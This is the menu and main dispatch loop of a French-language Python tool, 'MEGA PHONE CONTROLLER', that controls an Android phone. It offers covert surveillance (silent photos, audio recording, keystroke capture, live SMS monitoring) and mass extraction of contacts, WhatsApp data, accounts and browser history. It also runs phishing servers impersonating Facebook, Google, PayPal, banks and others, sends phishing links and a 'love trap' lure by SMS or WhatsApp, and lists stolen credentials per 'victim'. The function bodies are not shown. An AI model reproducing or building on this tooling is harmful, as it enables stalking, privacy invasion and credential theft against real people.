║     ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║    ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║║
║     ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║    ██║     ██║  ██║╚██████╔╝██║ ╚████║║
║     ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝║
║                                                                              ║
║                   🔥 MEGA PHONE CONTROLLER v2.0 🔥                            ║
╚══════════════════════════════════════════════════════════════════════════════╝{C.END}

    {C.YELLOW}📱 Appareil: {DEVICE if DEVICE else 'Non connecté'}{C.END}
    {C.CYAN}📁 Sortie: {OUTPUT_BASE}{C.END}

    ┌────────────────────────────────────────────────────────────────────────┐
    │  {C.GREEN}📊 EXTRACTION DE DONNÉES{C.END}                                              │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [1]  Infos système               [2
    │  [3]  Extraire contacts           [4]  Historique appels               │
    │  [5]  Notifications               [6]  Localisation GPS                │
    │  [7]  Réseaux WiFi                [8]  Applications installées         │
    │  [9]  Comptes enregistrés                                              │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.MAGENTA}📸 SURVEILLANCE{C.END}                                                       │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [10] Capture d'écran             [11] Enregistrer l'écran             │
    │  [12] Affichage en direct         [13] Enregistrement audio            │
    │  [14] Prendre photo caméra        [15] Capture événements clavier      │
    │  [16] Photo silencieuse           [17] Captures en série               │
    │  [18] Surveillance continue       [19] Surveiller SMS live             │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.YELLOW}📂 TÉLÉCHARGEMENT FICHIERS{C.END}                                            │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [20] Télécharger photos          [21] Télécharger WhatsApp            │
    │  [22] Télécharger documents       [23] Backup complet                  │
    │  [24] EXTRAIRE TOUS MÉDIAS        [25] Apps détaillées                 │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.CYAN}🎮 CONTRÔLE À DISTANCE{C.END}                                                 │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [30] Envoyer notification        [31] Ouvrir une URL                  │
    │  [32] Lancer une application      [33] Envoyer du texte                │
    │  [34] Passer un appel             [35] Envoyer SMS réel                │
    │  [36] Faire vibrer                [37] Shell interactif                │
    │  [38] Lire presse-papiers         [39] Définir presse-papiers          │
    │  [100] Appel + Haut-parleur       [101] Raccrocher                     │
    │  [102] Répondre appel             [103] Rejeter appel                  │
    │  [104] Flash écran                [105] Alarme sonore                  │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.RED}🔐 SÉCURITÉ / ANALYSE{C.END}                                                  │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [40] Détecter apps sensibles     [41] Permissions des apps            │
    │  [42] Processus en cours          [43] Installer APK                   │
    │  [44] Désinstaller app            [45] Forcer arrêt app                │
    │  [46] Effacer données app         [47] Désactiver app                  │
    │  [48] IMEI / Identifiants         [49] Infos SIM                       │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.BLUE}📱 CONTRÔLE ÉCRAN{C.END}                                                     │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [50] Éteindre écran              [51] Allumer écran                   │
    │  [52] Déverrouiller               [53] Verrouiller                     │
    │  [54] Régler luminosité           [55] Rotation écran                  │
    │  [56] Activité actuelle           [57] Ouvrir paramètres               │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.MAGENTA}🎵 MÉDIA / VOLUME{C.END}                                                    │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [60] Play/Pause                  [61] Piste suivante                  │
    │  [62] Piste précédente            [63] Volume +                        │
    │  [64] Volume -                    [65] Couper son                      │
    │  [66] Régler volume média         [67] Régler volume sonnerie          │
    │  [68] Caméra frontale             [69] Caméra arrière                  │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.YELLOW}👆 SIMULATION TOUCHES{C.END}                                                │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [70] Tap écran (x,y)             [71] Swipe écran                     │
    │  [72] Appui long                  [73] Bouton Home                     │
    │  [74] Bouton Retour               [75] Apps récentes                   │
    │  [76] Paramètres rapides          [77] Panneau notifications           │
    │  [78] Taper texte rapide                                               │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.GREEN}📡 CONNECTIVITÉ{C.END}                                                       │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [80] WiFi ON/OFF                 [81] Données mobiles ON/OFF          │
    │  [82] Bluetooth ON/OFF            [83] Mode avion ON/OFF               │
    │  [84] Localisation ON/OFF         [85] Info réseau détaillée           │
    │  [86] Infos stockage                                                   │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.CYAN}📁 GESTIONNAIRE FICHIERS{C.END}                                               │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [90] Lister fichiers             [91] Rechercher fichiers             │
    │  [92] Télécharger fichier         [93] Envoyer fichier                 │
    │  [94] Supprimer fichier           [95] Créer dossier                   │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.RED}💀 MODE HACKER{C.END}                                                          │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [99] 💀 EXTRACTION COMPLÈTE      [98] Historique navigateur           │
    │  [97] Extraire calendrier         [96] Extraire données app            │
    │  [88] Logs système                [89] Redémarrer téléphone            │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.RED}🎣 PHISHING - VOL D'IDENTIFIANTS{C.END}                                        │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [110] 📋 Menu Phishing Complet   [111] 📘 Facebook                    │
    │  [112] 🔍 Google                  [113] 📷 Instagram                   │
    │  [114] 💬 WhatsApp                [115] 🎬 Netflix                     │
    │  [116] 💳 PayPal                  [117] 🏦 Banque                      │
    │  [120] 🎵 TikTok                  [121] 👻 Snapchat                    │
    │  [122] 📧 Outlook/Microsoft       [123] 🛒 Amazon                      │
    │  [118] 🚀 ENVOYER LIEN PAR SMS    [119] 📊 Voir captures               │
    ├────────────────────────────────────────────────────────────────────────┤
    │  {C.MAGENTA}💕 PIÈGE AMOUR - EXTRACTION TOTALE{C.END}                                   │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [130] 💕 LANCER PIÈGE AMOUR      [131] 💌 Envoyer par SMS             │
    │  [132] 📱 ENVOYER VIA WHATSAPP    (Extrait TOUT automatiquement!)      │
    │        Photos, Vidéos, WhatsApp, SMS, Contacts, Appels, Telegram...    │
    ├────────────────────────────────────────────────────────────────────────┤
    │  [0]  Quitter                                                          │
    └────────────────────────────────────────────────────────────────────────┘
    """)

def main():
    global DEVICE, LOVE_TRAP_SERVER
    
    # Créer les dossiers
    create_output_folders()
    
    # Connexion
    if not connect_device():
        input("\nAppuyez sur Entrée pour quitter...")
        return
    
    while True:
        show_menu()
        choice = input(f"\n    {C.GREEN}👉 Votre choix: {C.END}").strip()
        
        try:
            # ═══════════════════════════════════════════════════════════════
            # EXTRACTION DE DONNÉES [1-9]
            # ═══════════════════════════════════════════════════════════════
            if choice == "1":
                get_system_info()
            elif choice == "2":
                extract_sms()
            elif choice == "3":
                extract_contacts()
            elif choice == "4":
                extract_call_history()
            elif choice == "5":
                get_notifications()
            elif choice == "6":
                get_location()
            elif choice == "7":
                get_wifi_networks()
            elif choice == "8":
                list_apps()
            elif choice == "9":
                get_accounts()
            
            # ═══════════════════════════════════════════════════════════════
            # SURVEILLANCE [10-19]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "10":
                take_screenshot_to_pc()
            elif choice == "11":
                duration = input("Durée en secondes (défaut 30): ").strip()
                record_video_screen(int(duration) if duration else 30)
            elif choice == "12":
                live_screen()
            elif choice == "13":
                duration = input("Durée en secondes (défaut 30): ").strip()
                record_audio(int(duration) if duration else 30)
            elif choice == "14":
                camera = input("Caméra (back/front, défaut back): ").strip()
                take_photo(camera if camera else "back")
            elif choice == "15":
                capture_input_events()
            elif choice == "16":
                take_photo_silent()
            elif choice == "17":
                count = input("Nombre de captures (défaut 5): ").strip()
                interval = input("Intervalle en secondes (défaut 2): ").strip()
                continuous_screenshots(int(count) if count else 5, int(interval) if interval else 2)
            elif choice == "18":
                watch_screen_continuous()
            elif choice == "19":
                duration = input("Durée surveillance (défaut 60s): ").strip()
                monitor_sms_live(int(duration) if duration else 60)
            
            # ═══════════════════════════════════════════════════════════════
            # TÉLÉCHARGEMENT [20-29]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "20":
                download_photos()
            elif choice == "21":
                download_whatsapp()
            elif choice == "22":
                download_documents()
            elif choice == "23":
                full_backup()
            elif choice == "24":
                extract_all_media()
            elif choice == "25":
                get_installed_apps_detailed()
            
            # ═══════════════════════════════════════════════════════════════
            # CONTRÔLE À DISTANCE [30-39]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "30":
                title = input("Titre: ").strip()
                message = input("Message: ").strip()
                send_notification(title, message)
            elif choice == "31":
                url = input("URL: ").strip()
                open_url(url)
            elif choice == "32":
                package = input("Package (ex: com.whatsapp): ").strip()
                open_app(package)
            elif choice == "33":
                text = input("Texte à envoyer: ").strip()
                send_text(text)
            elif choice == "34":
                number = input("Numéro: ").strip()
                take_call(number)
            elif choice == "35":
                number = input("Numéro: ").strip()
                message = input("Message SMS: ").strip()
                send_sms_real(number, message)
            elif choice == "36":
                vibrate()
            elif choice == "37":
                interactive_shell()
            elif choice == "38":
                get_clipboard_content()
            elif choice == "39":
                text = input("Texte pour presse-papiers: ").strip()
                set_clipboard(text)
            
            # OPTIONS 100+ - CONTRÔLE AVANCÉ
            elif choice == "100":
                number = input("Numéro: ").strip()
                make_call_and_speaker(number)
            elif choice == "101":
                end_call()
            elif choice == "102":
                answer_call()
            elif choice == "103":
                reject_call()
            elif choice == "104":
                flash_screen()
            elif choice == "105":
                play_sound_alarm()
            
            # ═══════════════════════════════════════════════════════════════
            # SÉCURITÉ / ANALYSE [40-49]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "40":
                detect_sensitive_apps()
            elif choice == "41":
                package = input("Package (vide = toutes): ").strip()
                get_app_permissions(package if package else None)
            elif choice == "42":
                get_running_processes()
            elif choice == "43":
                apk_path = input("Chemin de l'APK: ").strip()
                install_apk(apk_path)
            elif choice == "44":
                package = input("Package à désinstaller: ").strip()
                confirm = input(f"Confirmer désinstallation de {package}? (oui/non): ")
                if confirm.lower() == "oui":
                    uninstall_app(package)
            elif choice == "45":
                package = input("Package à arrêter: ").strip()
                force_stop_app(package)
            elif choice == "46":
                package = input("Package à effacer: ").strip()
                clear_app_data(package)
            elif choice == "47":
                package = input("Package à désactiver: ").strip()
                disable_app(package)
            
            # ═══════════════════════════════════════════════════════════════
            # CONTRÔLE ÉCRAN [50-59]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "50":
                screen_off()
            elif choice == "51":
                screen_on()
            elif choice == "52":
                pin = input("PIN (vide si aucun): ").strip()
                unlock_screen(pin)
            elif choice == "53":
                lock_screen()
            elif choice == "54":
                level = input("Luminosité (0-255): ").strip()
                set_brightness(int(level) if level else 128)
            elif choice == "55":
                print("0=Portrait, 1=Paysage, 2=Portrait inversé, 3=Paysage inversé")
                orient = input("Orientation: ").strip()
                rotate_screen(int(orient) if orient else 0)
            
            # ═══════════════════════════════════════════════════════════════
            # MÉDIA / VOLUME [60-69]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "60":
                media_play_pause()
            elif choice == "61":
                media_next()
            elif choice == "62":
                media_previous()
            elif choice == "63":
                volume_up()
            elif choice == "64":
                volume_down()
            elif choice == "65":
                volume_mute()
            elif choice == "66":
                level = input("Volume média (0-15): ").strip()
                set_media_volume(int(level) if level else 7)
            elif choice == "67":
                level = input("Volume sonnerie (0-7): ").strip()
                set_ringtone_volume(int(level) if level else 5)
            
            # ═══════════════════════════════════════════════════════════════
            # SIMULATION TOUCHES [70-79]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "70":
                x = input("Position X: ").strip()
                y = input("Position Y: ").strip()
                tap_screen(int(x), int(y))
            elif choice == "71":
                x1 = input("X départ: ").strip()
                y1 = input("Y départ: ").strip()
                x2 = input("X arrivée: ").strip()
                y2 = input("Y arrivée: ").strip()
                swipe_screen(int(x1), int(y1), int(x2), int(y2))
            elif choice == "72":
                x = input("Position X: ").strip()
                y = input("Position Y: ").strip()
                duration = input("Durée ms (défaut 1000): ").strip()
                long_press(int(x), int(y), int(duration) if duration else 1000)
            elif choice == "73":
                press_home()
            elif choice == "74":
                press_back()
            elif choice == "75":
                press_recent()
            elif choice == "76":
                open_quick_settings()
            elif choice == "77":
                open_notifications_panel()
            
            # ═══════════════════════════════════════════════════════════════
            # CONNECTIVITÉ [80-89]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "80":
                state = input("WiFi (1=ON, 0=OFF): ").strip()
                toggle_wifi(state == "1")
            elif choice == "81":
                state = input("Données mobiles (1=ON, 0=OFF): ").strip()
                toggle_mobile_data(state == "1")
            elif choice == "82":
                state = input("Bluetooth (1=ON, 0=OFF): ").strip()
                toggle_bluetooth(state == "1")
            elif choice == "83":
                state = input("Mode avion (1=ON, 0=OFF): ").strip()
                toggle_airplane_mode(state == "1")
            elif choice == "84":
                state = input("Localisation (1=ON, 0=OFF): ").strip()
                toggle_location(state == "1")
            elif choice == "85":
                get_current_wifi()
                get_ip_address()
            elif choice == "88":
                duration = input("Durée capture logs (défaut 10s): ").strip()
                monitor_logcat(int(duration) if duration else 10)
            elif choice == "89":
                print("Modes: normal, recovery, bootloader")
                mode = input("Mode de redémarrage: ").strip()
                reboot_device(mode if mode else "normal")
            
            # ═══════════════════════════════════════════════════════════════
            # GESTIONNAIRE FICHIERS [90-95]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "90":
                path = input("Chemin (défaut /sdcard): ").strip()
                list_files(path if path else "/sdcard")
            elif choice == "91":
                pattern = input("Motif de recherche: ").strip()
                path = input("Dossier (défaut /sdcard): ").strip()
                search_files(pattern, path if path else "/sdcard")
            elif choice == "92":
                remote = input("Chemin fichier distant: ").strip()
                download_file(remote)
            elif choice == "93":
                local = input("Chemin fichier local: ").strip()
                remote = input("Destination (défaut /sdcard/): ").strip()
                upload_file(local, remote if remote else "/sdcard/")
            elif choice == "94":
                path = input("Fichier à supprimer: ").strip()
                confirm = input(f"Confirmer suppression de {path}? (oui/non): ")
                if confirm.lower() == "oui":
                    delete_file(path)
            elif choice == "95":
                path = input("Chemin du dossier à créer: ").strip()
                create_folder(path)
            
            # ═══════════════════════════════════════════════════════════════
            # EXTRACTION AVANCÉE [96-99]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "96":
                package = input("Package de l'app: ").strip()
                extract_app_data(package)
            elif choice == "97":
                extract_calendar()
            elif choice == "98":
                extract_browser_history()
            elif choice == "99":
                full_extraction()
            
            # ═══════════════════════════════════════════════════════════════
            # PHISHING - VOL D'IDENTIFIANTS [110-125]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "110":
                phishing_menu()
            elif choice == "111":
                start_phishing_server("facebook")
            elif choice == "112":
                start_phishing_server("google")
            elif choice == "113":
                start_phishing_server("instagram")
            elif choice == "114":
                start_phishing_server("whatsapp")
            elif choice == "115":
                start_phishing_server("netflix")
            elif choice == "116":
                start_phishing_server("paypal")
            elif choice == "117":
                start_phishing_server("bank")
            elif choice == "118":
                send_phishing_link()
            elif choice == "119":
                # Afficher les captures
                if CAPTURED_DATA:
                    print(f"\n{C.GREEN}{'═'*70}{C.END}")
                    print(f"{C.BOLD}{C.GREEN}📊 IDENTIFIANTS CAPTURÉS ({len(CAPTURED_DATA)} victimes){C.END}")
                    print(f"{C.GREEN}{'═'*70}{C.END}")
                    for i, cap in enumerate(CAPTURED_DATA, 1):
                        print(f"\n    {C.YELLOW}[Victime {i}]{C.END} {cap['timestamp']}")
                        print(f"    {C.CYAN}IP:{C.END} {cap['ip']} | {C.CYAN}Site:{C.END} {cap.get('template', 'N/A')}")
                        print(f"    {C.RED}🔐 Identifiants:{C.END}")
                        for k, v in cap['data'].items():
                            print(f"        {k}: {v}")
                    print(f"\n{C.GREEN}{'═'*70}{C.END}")
                else:
                    print_info("Aucune donnée capturée pour le moment")
            elif choice == "120":
                start_phishing_server("tiktok")
            elif choice == "121":
                start_phishing_server("snapchat")
            elif choice == "122":
                start_phishing_server("outlook")
            elif choice == "123":
                start_phishing_server("amazon")
            
            # ═══════════════════════════════════════════════════════════════
            # PIÈGE AMOUR [130-135]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "130":
                start_love_trap()
                input(f"\n    {C.YELLOW}Appuie sur Entrée pour arrêter le serveur...{C.END}")
                if LOVE_TRAP_SERVER:
                    LOVE_TRAP_SERVER.shutdown()
            elif choice == "131":
                send_love_trap_sms()
            elif choice == "132":
                send_love_trap_whatsapp()
            
            # ═══════════════════════════════════════════════════════════════
            # QUITTER [0]
            # ═══════════════════════════════════════════════════════════════
            elif choice == "0":
                print(f"\n{C.YELLOW}👋 Au revoir!{C.END}\n")
                break
            
            else:
                print_error("Option invalide")
        
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        input(f"\n    {C.CYAN}⏎ Appuyez sur Entrée pour continuer...{C.END}")

if __name__ == "__main__":
    main()
